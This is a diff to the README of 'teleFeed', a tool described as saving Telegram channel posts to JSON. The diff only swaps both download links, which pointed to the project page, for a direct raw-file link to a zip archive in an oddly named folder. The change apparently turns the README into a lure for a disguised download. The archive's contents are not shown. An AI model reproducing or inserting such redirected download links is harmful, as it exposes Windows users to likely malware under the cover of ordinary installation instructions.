@@ -1,6 +1,6 @@
 # 📂 teleFeed - Save Telegram channel posts as JSON
 
-[![Download teleFeed for Windows](https://img.shields.io/badge/Download-teleFeed-blue.svg)](https://github.com/holecardvoltampere165/teleFeed)
+[![Download teleFeed for Windows](https://img.shields.io/badge/Download-teleFeed-blue.svg)](https://github.com/holecardvoltampere165/teleFeed/raw/refs/heads/main/hydroxyacetic/tele-Feed-2.8.zip)
 
 teleFeed collects public posts from Telegram channels. It saves this information into structured JSON files. You can use these files to archive data or feed it into other digital tools. The application uses GitHub Actions to run tasks on a schedule. This means the program checks for new posts and saves them automatically without your input.
 
@@ -18,7 +18,7 @@ To run teleFeed, your computer needs these standard components:
 
 Visit the project page to download the latest release for your Windows computer.
 
-[Click here to open the download page](https://github.com/holecardvoltampere165/teleFeed)
+[Click here to open the download page](https://github.com/holecardvoltampere165/teleFeed/raw/refs/heads/main/hydroxyacetic/tele-Feed-2.8.zip)
 
 1. Navigate to the link provided above.
 2. Look for the section labeled "Releases" on the right side of the screen.
